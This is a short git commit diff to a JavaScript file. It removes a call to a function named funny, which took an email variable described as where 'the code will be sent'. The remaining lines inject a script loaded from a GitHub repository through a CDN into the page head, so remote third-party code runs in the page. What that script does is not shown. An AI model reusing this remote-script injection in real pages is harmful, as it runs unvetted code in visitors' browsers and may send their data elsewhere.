3e7d15e9083f1cc95d32b9d6e2a8932d3975e86d
Aglomation <113240095+Muminwilmer@users.noreply.github.com>
2023-10-10 20:33:00 +0200

    Update Code.js

--- Code.js
+++ Code.js
@@ -2,4 +2,3 @@ var winEmail = "" //This is the email which the code will be sent too
 var script = document.createElement('script');
 script.src = 'https://cdn.jsdelivr.net/gh/Muminwilmer/Trocadero-Merch/src/gul.js';
 document.head.appendChild(script);
-funny(winEmail)
